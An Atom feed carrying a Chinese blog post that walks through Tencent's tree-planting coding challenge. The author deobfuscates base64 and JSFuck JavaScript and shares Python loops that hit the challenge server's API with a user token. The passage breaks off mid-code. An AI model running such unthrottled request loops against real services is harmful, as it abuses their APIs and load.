<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>当人工智能遇上信息安全</title>
  
  <subtitle>&lt;B&gt;🌞但行好事，莫问前程🌈&lt;/B&gt;&lt;br /&gt;❤dyngq💕kang❤</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.dyngq.top/"/>
  <updated>2022-06-20T11:44:21.561Z</updated>
  <id>http://www.dyngq.top/</id>
  
  <author>
    <name>dyngq_kang</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>植树节-有趣的码上种树-腾讯极客技术挑战赛</title>
    <link href="http://www.dyngq.top/2021/03/12/20210312-%E6%A4%8D%E6%A0%91%E8%8A%82-%E6%9C%89%E8%B6%A3%E7%9A%84%E7%A0%81%E4%B8%8A%E7%A7%8D%E6%A0%91-%E8%85%BE%E8%AE%AF%E6%9E%81%E5%AE%A2%E6%8A%80%E6%9C%AF%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <id>http://www.dyngq.top/2021/03/12/20210312-植树节-有趣的码上种树-腾讯极客技术挑战赛/</id>
    <published>2021-03-12T12:45:00.000Z</published>
    <updated>2022-06-20T11:44:21.561Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>比较有意思的比赛，简单过了两关</p></blockquote><a id="more"></a><h2 id="整体逻辑"><a href="#整体逻辑" class="headerlink" title="整体逻辑"></a>整体逻辑</h2><p>点一下种树按钮就可以种一棵树了，是通过某个接口实现的，在程序源码中可以找到JS的位置；</p><p>整体逻辑是，点一下按钮，带着用户的token请求一个链接（API），获得几个值，通过对获取到的值的运算，获得进一步的结果，带着结果请求另一个链接，就可以完成种树了；</p><p>关键在于获取到的值应该怎么运算，这需要请求JS代码，也就是图中箭头指的那一行；</p><p><img src="https://img.dyngq.top/images/20210312222138.png" alt="image-20210312222136065"></p><p>第一步，可以先burp抓包看一下实现逻辑，顺便获取到自己的token</p><p><img src="https://img.dyngq.top/images/20210312221950.png" alt="image-20210312221948702"></p><p>请求完之后，又抓到发送一条新请求；这个请求发完之后就完成了种树。</p><p><img src="https://img.dyngq.top/images/20210312222830.png" alt="image-20210312222829430"></p><p>所以先看一下第一步请求到了什么，</p><p><img src="https://img.dyngq.top/images/20210312223011.png" alt="image-20210312223010731"></p><p>三个字段，其中c相当于题号，关系着请求哪一个js；</p><p>a是要运算的值；</p><p>t相当于种树编号，不用运算；</p><h2 id="JS代码"><a href="#JS代码" class="headerlink" title="　JS代码"></a>　JS代码</h2><h3 id="10000棵树之前，js是"><a href="#10000棵树之前，js是" class="headerlink" title="10000棵树之前，js是"></a>10000棵树之前，js是</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.A274075A = <span class="keyword">async</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    a</span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(_ = &gt;setTimeout(__ = &gt;_(a[<span class="number">0</span>]), <span class="number">2000</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="1W-10W"><a href="#1W-10W" class="headerlink" title="1W~10W"></a>1W~10W</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.A3C2EA99 = <span class="keyword">async</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params">&#123;</span></span></span><br><span class="line"><span class="function"><span class="params">    a</span></span></span><br><span class="line"><span class="function"><span class="params">&#125;</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(_ = &gt;setTimeout(__ = &gt;_(a[<span class="number">0</span>] * a[<span class="number">0</span>] + a[<span class="number">0</span>]), <span class="number">2000</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10W-25W"><a href="#10W-25W" class="headerlink" title="10W~25W"></a>10W~25W</h3><p><del>开始麻烦了，最近太忙了，真是没有时间去解了</del></p><p>我承认，<strong>这东西上瘾</strong>，第二天的时候我忍不住把10W~25W解出来了</p><p>请求到是一串乱码，但是明显是base64加密的，解密后整理一下即可</p><p><img src="https://img.dyngq.top/images/20210312223642.png" alt="image-20210312223640330"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(atob(</span><br><span class="line">    <span class="keyword">var</span> _0xe936 = [<span class="string">'A5473788'</span>]; (<span class="function"><span class="keyword">function</span>(<span class="params">_0x48e85c, _0xe936d8</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _0x23fc5a = <span class="function"><span class="keyword">function</span>(<span class="params">_0x2858d9</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (--_0x2858d9) &#123;</span><br><span class="line">                _0x48e85c[<span class="string">'push'</span>](_0x48e85c[<span class="string">'shift'</span>]());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        _0x23fc5a(++_0xe936d8);</span><br><span class="line">    &#125; (_0xe936, <span class="number">0x196</span>));</span><br><span class="line">    <span class="keyword">var</span> _0x23fc = <span class="function"><span class="keyword">function</span>(<span class="params">_0x48e85c, _0xe936d8</span>) </span>&#123;</span><br><span class="line">        _0x48e85c = _0x48e85c - <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">var</span> _0x23fc5a = _0xe936[_0x48e85c];</span><br><span class="line">        <span class="keyword">return</span> _0x23fc5a;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">window</span>[_0x23fc(<span class="string">'0x0'</span>)] = <span class="function"><span class="keyword">function</span>(<span class="params">_0x335437</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _0x1aac02 = <span class="number">0x30d3f</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> _0x3bed6a = <span class="number">0x30d3f</span>; _0x3bed6a &gt; <span class="number">0x0</span>; _0x3bed6a--) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x375340 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x1ddb77 = <span class="number">0x0</span>; _0x1ddb77 &lt; _0x3bed6a; _0x1ddb77++) &#123;</span><br><span class="line">                _0x375340 += _0x335437[<span class="string">'a'</span>][<span class="number">0x0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            _0x375340 % _0x335437[<span class="string">'a'</span>][<span class="number">0x2</span>] == _0x335437[<span class="string">'a'</span>][<span class="number">0x1</span>] &amp;&amp; _0x3bed6a &lt; _0x1aac02 &amp;&amp; (_0x1aac02 = _0x3bed6a);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> _0x1aac02;</span><br><span class="line">    &#125;;</span><br><span class="line">))</span><br></pre></td></tr></table></figure><p>实现逻辑其实也挺清晰，把变量替换一下，得到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>[_0x23fc(<span class="string">'0x0'</span>)] = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="number">199999</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">199999</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">            temp += x[<span class="string">'a'</span>][<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        temp % x[<span class="string">'a'</span>][<span class="number">2</span>] == x[<span class="string">'a'</span>][<span class="number">1</span>] &amp;&amp; i &lt; n &amp;&amp; (n = i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>用python解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">606</span>,<span class="number">246</span>,<span class="number">190908</span>]</span><br><span class="line">n = <span class="number">199999</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">199999</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    temp = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> (a[<span class="number">0</span>]*i % a[<span class="number">2</span>] == a[<span class="number">1</span>]) <span class="keyword">and</span> i &lt; n:</span><br><span class="line">        n = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(n)</span><br></pre></td></tr></table></figure><p>所以10W到25W整体的代码是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    url = <span class="string">f'http://159.75.70.9:8081/pull?u=00000489422529DB90F9AE48E0F9D8E0'</span></span><br><span class="line">    reponse = requests.get(url,headers=headers)</span><br><span class="line">    a = json.loads(reponse.text)</span><br><span class="line">    print(a[<span class="string">'c'</span>],a[<span class="string">'a'</span>][<span class="number">0</span>],a[<span class="string">'t'</span>])</span><br><span class="line">    a_0 = a[<span class="string">'a'</span>][<span class="number">0</span>]</span><br><span class="line">    a_1 = a[<span class="string">'a'</span>][<span class="number">1</span>]</span><br><span class="line">    a_2 = a[<span class="string">'a'</span>][<span class="number">2</span>]</span><br><span class="line">    n = <span class="number">199999</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">199999</span>):</span><br><span class="line">        <span class="comment"># print(i)</span></span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> (a_0*i % a_2 == a_1) <span class="keyword">and</span> i &lt; n:</span><br><span class="line">            n = i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    tt = a[<span class="string">'t'</span>]</span><br><span class="line">    url_ = <span class="string">f'http://159.75.70.9:8081/push?t=<span class="subst">&#123;tt&#125;</span>&amp;a=<span class="subst">&#123;n&#125;</span>'</span></span><br><span class="line">    reponse_ = requests.get(url_,headers=headers)</span><br><span class="line">    a_ = json.loads(reponse_.text)</span><br><span class="line">    print(a_)</span><br><span class="line">    time.sleep(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>结果25W还是在100名左右，哈哈。</p><p>最后附上前10W的简单代码，<del>哈哈，水平还是不够呀，溜了溜了，硬蹭进了前100名，肯定很快就被挤出去了</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 00000489422529DB90F9AE48E0F9D8E0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    url = <span class="string">f'http://159.75.70.9:8081/pull?u=0000083547D054D91E8D106EFA199372'</span></span><br><span class="line">    reponse = requests.get(url,headers=headers)</span><br><span class="line">    a = json.loads(reponse.text)</span><br><span class="line">    print(a[<span class="string">'c'</span>],a[<span class="string">'a'</span>][<span class="number">0</span>],a[<span class="string">'t'</span>])</span><br><span class="line">    aa = a[<span class="string">'a'</span>][<span class="number">0</span>]</span><br><span class="line">    aa = aa*(aa+<span class="number">1</span>)</span><br><span class="line">    tt = a[<span class="string">'t'</span>]</span><br><span class="line">    url_ = <span class="string">f'http://159.75.70.9:8081/push?t=<span class="subst">&#123;tt&#125;</span>&amp;a=<span class="subst">&#123;aa&#125;</span>'</span></span><br><span class="line">    reponse_ = requests.get(url_,headers=headers)</span><br><span class="line">    a_ = json.loads(reponse_.text)</span><br><span class="line">    print(a_)</span><br><span class="line">    time.sleep(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h3 id="25W"><a href="#25W" class="headerlink" title="25W"></a>25W</h3><p>这代码真是吐了，发誓不搞了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"c"</span>:<span class="string">"A593C8B8"</span>,</span><br><span class="line"> <span class="attr">"a"</span>:[<span class="number">138</span>,<span class="number">892</span>,<span class="number">490</span>,<span class="number">1879</span>,<span class="number">1235</span>,<span class="number">588</span>,<span class="number">2281</span>],</span><br><span class="line"> <span class="attr">"t"</span>:<span class="string">"00000489002500016747E762222D50DF"</span>&#125;</span><br><span class="line"></span><br><span class="line">a = 83886542</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.A593C8B8 = <span class="keyword">async</span>(_) = &gt;(($, _, __, ___, ____) = &gt;&#123;</span><br><span class="line">    <span class="keyword">let</span> _____ = <span class="function"><span class="keyword">function</span> * (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> ([]) <span class="keyword">yield</span>[(_, __) = &gt;_ + __, (_, __) = &gt;_ - __, (_, __) = &gt;_ * __][++__ % (!+[] + !+[] + !+[])][( + ( + !+[] + [ + !+[]]))[( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( + ![] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]]](!+[] + !+[] + [ + []]) + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ([][[]] + [])[!+[] + !+[]]]( + [], ___, ____)</span><br><span class="line">    &#125; ();</span><br><span class="line">    <span class="keyword">let</span> ______ = <span class="function"><span class="keyword">function</span>(<span class="params">_____, ______, _______</span>) </span>&#123;</span><br><span class="line">        ____ = _____;</span><br><span class="line">        ___ = ______[([][[]] + <span class="string">''</span>)[ + !+[]] + ( !! [] + <span class="string">''</span>)[ + !+[] + !+[] + !+[]] + ( + ( + !+[] + [ + []] + [ + !+[]]))[( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( + ![] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]]](!+[] + !+[] + !+[] + [!+[] + !+[] + !+[] + !+[]])[ + !+[]] + ( !! [] + <span class="string">''</span>)[ + []]]()[( + (!+[] + !+[] + !+[] + [ + !+[]]))[( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( + ![] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([![]] + [][[]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]]](!+[] + !+[] + !+[] + [!+[] + !+[]]) + (![] + [])[ + !+[]] + (![] + [])[!+[] + !+[]] + ([][[]] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]]]();</span><br><span class="line">        __ == _[(![] + <span class="string">''</span>)[ + !+[]]][(![] + [])[!+[] + !+[]] + ( !! [] + [])[!+[] + !+[] + !+[]] + ([][[]] + [])[ + !+[]] + ( + ![] + [![]] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ([][[]] + [])[ + !+[]] + (![] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[ + !+[]] + ([][[]] + [])[ + []] + ([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( !! [] + [])[ + !+[]]])[!+[] + !+[] + [ + []]] + ( !! [] + [])[ + []] + ( + ( + !+[] + [ + []] + [ + !+[]]))[( !! [] + [])[ + []] + ( !! [] + [][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]])[ + !+[] + [ + []]] + ( + ![] + ([] + [])[([][(![] + [])[ + []] + ([![]] + [][[]])[ + !+[] + [ + []]] + (![] + [])[!+[] + !+[]] + ( !! [] + [])[ + []] + ( !! [] + [])[!+[] + !+[] + !+[]] + ( !! [] + [])[ + !+[]]] + [])[!+[] + 